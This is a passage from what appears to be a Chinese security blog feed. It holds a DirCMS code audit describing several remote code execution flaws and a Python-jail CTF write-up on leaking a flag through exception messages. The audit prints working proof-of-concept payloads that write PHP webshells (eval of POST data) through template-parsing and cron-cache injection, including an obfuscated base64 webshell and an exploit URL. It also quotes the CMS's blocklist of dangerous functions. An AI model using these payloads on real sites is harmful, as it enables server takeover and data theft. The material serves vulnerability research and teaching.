<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">s</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">template</span><span class="o">&amp;</span><span class="n">app</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=</span><span class="n">list_data</span><span class="mf">.</span><span class="n">html</span><span class="o">&amp;</span><span class="n">phpcmf_dir</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">catid</span><span class="o">=%</span><span class="mi">20</span><span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="o">%</span><span class="mi">20</span><span class="n">name</span><span class="o">=</span><span class="n">phpinfo</span><span class="o">%</span><span class="mi">20</span><span class="n">param0</span><span class="o">=-</span><span class="mi">1</span>
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230809040203.png" alt="20230809040203" /></p>

<p>这个漏洞的利用思路来自于文章 <a href="https://xz.aliyun.com/t/10002">某cms 前台RCE漏洞分析 - 先知社区</a>，通过变量覆盖控制模板变量来达成 RCE，不得不说十分巧妙。</p>

<h2 id="总结">总结</h2>
<ol>
  <li>模板解析功能是提高 php CMS 框架灵活性的重要功能，但同样意味着容易出现可利用的点，例如，后台修改模板、利用变量覆盖控制控制模板变量等利用方式。</li>
  <li>缓存文件通常会在程序中被包含进来，一旦缓存文件的内容可控，就可能造成严重的影响。</li>
</ol>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a></li>
  <li><a href="https://xz.aliyun.com/t/10002">某cms 前台RCE漏洞分析 - 先知社区</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="code audit" /><category term="CMS" /><summary type="html"><![CDATA[DirCMS 审计 环境搭建 官网链接：http://www.dircms.cc/ 下载地址：dircms6 目录结构 代码目录结构 . ├── admin.php ├── api ├── cache ├── config ├── dircms ├── favicon.ico ├── index.php ├── install.php ├── LICENSE ├── mobile ├── nginx.htaccess ├── README.en.md ├── README.md ├── static ├── template ├── test.php └── uploadfile dircms 为框架内核文件，基于迅睿 CMS 框架：迅睿CMS框架 MVC 结构 控制器：功能相关控制器存放在 dircms/App 目录下 服务类（Service）：存放在 dircms/Fcms/Core/Service.php 基础类：存放在 dircms/Fcms/Library 目录下 数据流：控制器 -&gt; 服务类 Service -&gt; 类加载（加载基础类） API pay ueditor 安全防护 dircms/Fcms/Library/Security.php 存在 XSS 过滤函数 xss_clean，其中除了 xss 过滤之外，还有部分的 php 函数过滤。 $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); 漏洞挖掘 后台代码执行（模板解析导致 RCE） dircms/Fcms/Core/Helper.php 中存在一个 php55_replace_function 函数： function php55_replace_function($value) { if (function_exists($value[1])) { // 执行函数体 $param = $value[2] == '$data' ? $this-&gt;data : $value[2]; return call_user_func_array( $value[1], is_array($param) ? ['data' =&gt; $param] : @explode(',', $param) ); } else { return '函数['.$value[1].']未定义'; } return $value[0]; } 该函数调用了 call_user_func_array 函数，一旦传入的参数 $value 可控，则可以执行任意 php 函数。 php55_replace_function 函数调用点较多，其中 dircms/Fcms/Library/Seo.php 中的 search 函数也用到了该方法，部分代码如下： $rep = new \php5replace($data); ... $seo['meta_title'] = str_replace('%', '', preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title'])); ... 使用正则表达式匹配 $seo['meta_title']) 的值，匹配内容包含整个函数调用。但是这里的执行也有一定限制： 函数名只能匹配小写字母、数字与下划线。 无法嵌套函数调用。 $seo['meta_title'])来源于后台 SEO 设置，在”设置”-&gt; SEO 设置 -&gt; 搜索 SEO 中可以设置 SEO 标题，在其中的内容中添加一个函数调用： [第{page}页{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{phpinfo(1)} 保存之后，再在前端访问搜索页面: /index.php?s=news&amp;c=search&amp;keyword=1111 当尝试使用 system 执行命令时，会发现输入的 system() 中的括号会被 html 转义，其过滤函数可以定位到 dircms/Fcms/Library/Security.php 中的 xss_clean 函数，该函数除了会进行 XSS 的过滤，还会进行 PHP 标签 &lt;? 以及敏感函数的过滤，如下所示： $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); 其中过滤了常见的一些命令执行函数，但并不完全，综合来看，我们需要找到满足下面条件的函数去执行命令： 不在黑名单内。 不能嵌套函数。 例如，我们可以使用 file_put_content 结合 php://filter 来写入文件，例如： file_put_contents("php://filter/write=convert.base64-decode/resource=evil.php","PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="); poc 如下： [第{page}页{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg==)} 前台代码执行（模板解析导致 RCE） 这个前台的 RCE 与上面的后台 RCE sink 点一致，都是利用 php55_replace_function 函数。 搜索 php55_replace_function 的调用点，主要出现在 dircms/Fcms/Library/Seo.php 和 dircms/Fcms/Library/Router.php 两个文件中。 Seo 类中的三个函数都有调用： dircms/Fcms/Library/Seo.php - Seo 类 - category 函数 - search 函数 - show 函数 其中，search 函数用于前端查询窗口，上面的后台 RCE 就是需要通过这个函数来触发，但此处的 payload 需要依赖后台数据修改。 show 函数用于文章的展示，查看某一篇文章时就会调用，部分代码如下： function show($mod, $data, $page = 1) { ... $meta_title = $mod['site'][SITE_ID]['show_title'] ? $mod['site'][SITE_ID]['show_title'] : '['.dr_lang('第%s页', '{page}').'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'; $meta_title = $page &gt; 1 ? str_replace(array('[', ']'), '', $meta_title) : preg_replace('/\[.+\]/U', '', $meta_title); $rep = new \php5replace($data); $seo['meta_title'] = preg_replace_callback('#{([A-Z_]+)}#U', array($rep, 'php55_replace_var'), $meta_title); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)}#U', array($rep, 'php55_replace_data'), $seo['meta_title']); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title']); $seo['meta_title'] = str_replace($data['join'].$data['join'], $data['join'], $seo['meta_title']); $seo['meta_title'] = htmlspecialchars(dr_clearhtml($seo['meta_title'])); ... } 可以看到其中用到了 {join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME} 这个模板，也就是说，在经过 php55_replace_data 函数时，就会使用文章实际的标题来替换 {title}。 但需要注意的是，这段代码调用完 php55_replace_data 之后，继续调用 php55_replace_function，如果我们将 title 填充为 {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}，就可以进入 php55_replace_function 的调用。 因此，只需要创建一篇文章，将标题填充为上述的 payload 即可，如果站点开启了注册，我们就可以直接创建一个普通用户，然后创建一篇文章就可以 RCE。 poc: {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)} 创建完之后在前台查看该文章就可以触发。 后台代码注入（缓存文件利用） 参考这篇文章 某CMS漏洞总结 - 先知社区，该漏洞出现在迅睿 CMS 框架版本 v4.3.3～v4.5.0，DirCMS 中没有明确标识版本，但根据代码逻辑判断属于该版本区间。 dircms/Core/Controllers/Admin/Cron.php 中的 add 函数会将用户输入写入缓存文件，并且每次访问时对缓存文件进行包含，由此造成代码注入，add 函数的代码如下： public function add() { $json = ''; if (is_file(WRITEPATH.'config/cron.php')) { require WRITEPATH.'config/cron.php'; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \Phpcmf\Service::L('input')-&gt;post('data', true); file_put_contents(WRITEPATH.'config/cron.php', '&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';'); \Phpcmf\Service::L('input')-&gt;system_log('设置自定义任务类型'); $this-&gt;_json(1, dr_lang('操作成功')); } \Phpcmf\Service::V()-&gt;assign([ 'data' =&gt; $data, ]); \Phpcmf\Service::V()-&gt;display('cron_add.html'); } 触发 add 函数的调用需要进入管理员后台 -&gt; 应用 -&gt; 应用插件 -&gt; 任务队列。 点击保存可以提交 post 报文，data 参数经过 json_encode 最终会写入 cache/config/cron.php ';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a=' 最终写入 cache/config/cron.php 文件内容如下： &lt;?php defined('FCPATH') OR exit('No direct script access allowed'); $json='{"1":{"name":"';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a='"}}'; 也参考这篇文章 某CMS漏洞总结 - 先知社区 中的 poc: isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data[1][name]=&amp;data[1][code]=[';file_put_contents('webshell.php',htmlspecialchars_decode('&lt;').'?php eval'.base64_decode('KA==').'@$_POST['.base64_decode('Ig==').'password'.base64_decode('Ig==').']'.base64_decode('KQ==').';?'.htmlspecialchars_decode('&gt;'));return;'] 前台代码执行（变量覆盖导致模板变量可控） dircms/Fcms/Core/View.php 中的 list_tag 函数中存在这样的代码： // list 标签解析 public function list_tag($_params) { ... switch ($system['action']) { case 'function': //执行函数 if (!isset($param['name'])) { return $this-&gt;_return($system['return'], 'name参数不存在'); } elseif (!function_exists($param['name'])) { return $this-&gt;_return($system['return'], '函数['.$param['name'].']未定义'); } $name = 'function-'.md5(dr_array2string($param)); $cache = \Phpcmf\Service::L('cache')-&gt;init()-&gt;get($name); if (!$cache) { $rt = call_user_func($param['name'], $param['param']); $cache = [ $rt ]; \Phpcmf\Service::L('cache')-&gt;init()-&gt;save($name, $cache, $system['cache']); } return $this-&gt;_return($system['return'], $cache, ''); break; 当 action 为字符串 function 时，会调用 call_user_func($param['name'], $param['param']) 执行函数。如果函数名与函数参数可控，则可以造成任意代码执行。 list_tag 函数在大量的模板文件中被调用，例如：cache/template/template_pc_default_home_api_list_data.html.cache.php。该文件是 template/pc/default/home/api/list_data.html 经过解析之后生成的 php 缓存文件。 当需要使用 list_data.html 这个前端文件时，就会将 cache/template/template_pc_default_home_api_list_data.html.cache.php 这个缓存文件包含进来。 该缓存文件的部分内容如下所示： &lt;?php $list_return = $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300"); if ($list_return) extract($list_return, EXTR_OVERWRITE); $count=dr_count($return); if (is_array($return)) { foreach ($return as $key=&gt;$t) { $is_first=$key==0 ? 1 : 0;$is_last=$count==$key+1 ? 1 : 0; ?&gt; &lt;div class="ajax-load-con content excerpt-one"&gt; &lt;div class="content-box posts-image-box"&gt; &lt;div class="posts-default-title"&gt; &lt;div class="post-entry-categories"&gt; 其中会调用 list_tag 函数，且传入参数 action=module module=news catid=$catid page=1 cache=300。可以看到参数是通过空格进行分割的键值对，list_tag 函数在进行处理时，会将键值对保存在 $system 这个变量中： foreach ($params as $t) { ... if (isset($system[$var])) { // 系统参数，只能出现一次，不能添加修饰符 $system[$var] = dr_safe_replace($val); } 例如第一个参数 action： $system['action'] = dr_safe_replace('module') 想要进入 call_user_func，就需要 action 的值为 function。但在内置的所有模板中，没有模板使用到了 action=function。 但需要注意的是，list_tag 在调用时 $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");，使用到了一个 $catid 变量。由于这个变量被直接拼接进来，假如构造 $catid = " action=function name=phpinfo param0=-1" 最终传入 list_tag 的参数就会变成： $this-&gt;list_tag("action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"); action 参数被设置了两次，但最终会都被设置为后者的值，这样也就达到了目的。 $catid 在哪被赋值呢？模板文件实际上是在 dircms/Fcms/Core/View.php 中的 display 函数中使用 include 包含进来的，在这个 include 的前方，正好调用了一次 extract 函数。 public function display($_name, $_dir = '') { if (!isset($this-&gt;_options['get'])) { $this-&gt;_options['get'] = \Phpcmf\Service::L('input')-&gt;xss_clean($_GET); } ... extract($this-&gt;_options, EXTR_PREFIX_SAME, 'data'); ... include $this-&gt;load_view_file($_view_file); ... } extract 函数可以造成变量覆盖，如果 $this-&gt;_options可控的话，就可以对 $catid 赋值。向上溯源可以发现根多地方都有调用 display 函数，但只有 dircms/Core/Controllers/Api/Api.php 中的 template 函数最方便利用： public function template() { $file = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('name')); $module = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('module')); $data = [ 'file' =&gt; $file, 'module' =&gt; $module, ]; ... \Phpcmf\Service::V()-&gt;assign(\Phpcmf\Service::L('input')-&gt;get('', true)); ob_start(); \Phpcmf\Service::V()-&gt;display($file); $html = ob_get_contents(); ob_clean(); ... } 直接调用 \Phpcmf\Service::V()-&gt;assign 函数并传入所有 GET 请求参数。\Phpcmf\Service::V()-&gt;assign 函数就是用于给 option 成员变量赋值的，如下所示： public function assign($key, $value = '') { if (!$key) { return FALSE; } if (is_array($key)) { foreach ($key as $k =&gt; $v) { $this-&gt;_options[$k] = $v; } } else { $this-&gt;_options[$key] = $value; } } 由此一来从 GET 请求参数中传入即可。poc 如下： /index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=list_data.html&amp;phpcmf_dir=admin&amp;catid=%20action=function%20name=phpinfo%20param0=-1 这个漏洞的利用思路来自于文章 某cms 前台RCE漏洞分析 - 先知社区，通过变量覆盖控制模板变量来达成 RCE，不得不说十分巧妙。 总结 模板解析功能是提高 php CMS 框架灵活性的重要功能，但同样意味着容易出现可利用的点，例如，后台修改模板、利用变量覆盖控制控制模板变量等利用方式。 缓存文件通常会在程序中被包含进来，一旦缓存文件的内容可控，就可能造成严重的影响。 参考资料 某CMS漏洞总结 - 先知社区 某cms 前台RCE漏洞分析 - 先知社区]]></summary></entry><entry><title type="html">pyjail bypass-09 绕过输出限制</title><link href="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html" rel="alternate" type="text/html" title="pyjail bypass-09 绕过输出限制" /><published>2023-08-03T18:23:57+08:00</published><updated>2023-08-03T18:23:57+08:00</updated><id>/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6</id><content type="html" xml:base="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html"><![CDATA[<blockquote>
  <ul>
    <li><a href="/python/2023/05/29/python-沙箱逃逸原理.html">pyjail 沙箱逃逸原理</a></li>
    <li><a href="/python/2023/05/30/python-沙箱逃逸绕过.html">pyjail 沙箱逃逸绕过</a>
      <ul>
        <li><a href="/python/2023/05/30/pyjail-bypass-01-绕过删除模块或方法.html">绕过删除模块或方法</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-02-字符串变换绕过.html">绕过基于字符串匹配的过滤</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-03-绕过命名空间限制.html">绕过命名空间限制</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-05-绕过长度限制.html">绕过多行限制</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-04-绕过多行限制.html">绕过长度限制</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-06-变量覆盖与函数篡改.html">变量覆盖与函数篡改</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-07-绕过-audit-hook.html">绕过 audit hook</a></li>
        <li><a href="/python/2023/05/30/pyjail-bypass-08-绕过-AST-沙箱.html">绕过 AST 沙箱</a></li>
        <li><a href="/python/2023/08/03/pyjail-bypass-09-绕过输出限制.html">绕过输出限制</a></li>
      </ul>
    </li>
  </ul>
</blockquote>

<h1 id="pyjail-没有输出的场景">PyJail 没有输出的场景</h1>
<p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>

<p>以 AmateursCTF 2023 的一道题目为例，题目的源码如下：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/local/bin/python
</span><span class="kn">from</span> <span class="n">flag</span> <span class="kn">import</span> <span class="n">flag</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span><span class="n">flag</span><span class="p">]:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">code</span> <span class="o">=</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Give code: </span><span class="sh">"</span><span class="p">))</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">e</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="se">\\</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid input</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">exec</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
</code></pre></div></div>

<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>

<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>

<h1 id="利用异常处理">利用异常处理</h1>
<p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
  <li>KeyError（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
  <li>FileNotFoundError（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
  <li>ValueError（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>

<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>

<h2 id="keyerror">KeyError</h2>
<p>KeyError 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">}[</span><span class="n">_</span><span class="p">]</span>
<span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<h2 id="filenotfounderror">FileNotFoundError</h2>
<p>FileNotFoundError 出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>

<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
<span class="p">[</span><span class="n">Errno</span> <span class="mi">2</span><span class="p">]</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">:</span> <span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<h2 id="valueerror">ValueError</h2>
<p>ValueError 比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
<span class="nb">ValueError</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">literal</span> <span class="k">for</span> <span class="nf">int</span><span class="p">()</span> <span class="k">with</span> <span class="n">base</span> <span class="mi">10</span><span class="p">:</span> <span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://github.com/daffainfo/ctf-writeup/tree/main/AmateursCTF%202023/Censorship">ctf-writeup/AmateursCTF 2023/Censorship at main · daffainfo/ctf-writeup</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Python" /><category term="pyjail" /><summary type="html"><![CDATA[pyjail 沙箱逃逸原理 pyjail 沙箱逃逸绕过 绕过删除模块或方法 绕过基于字符串匹配的过滤 绕过命名空间限制 绕过多行限制 绕过长度限制 变量覆盖与函数篡改 绕过 audit hook 绕过 AST 沙箱 绕过输出限制 PyJail 没有输出的场景 在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。 以 AmateursCTF 2023 的一道题目为例，题目的源码如下： #!/usr/local/bin/python from flag import flag for _ in [flag]: while True: try: code = ascii(input("Give code: ")) if "flag" in code or "e" in code or "t" in code or "\\" in code: raise ValueError("invalid input") exec(eval(code)) except Exception as err: print(err) 在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。 注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。 利用异常处理 作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为： KeyError（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用） FileNotFoundError（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。 ValueError（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。 这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。 KeyError KeyError 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入： Give code: {"1":"2"}[_] 'flag{xxxx}' FileNotFoundError FileNotFoundError 出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。 但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。 Give code: open(_) [Errno 2] No such file or directory: 'flag{xxxx}' ValueError ValueError 比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如： Give code: int(_) ValueError: invalid literal for int() with base 10: 'flag{xxxx}' 当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。 参考 ctf-writeup/AmateursCTF 2023/Censorship at main · daffainfo/ctf-writeup]]></summary></entry></feed>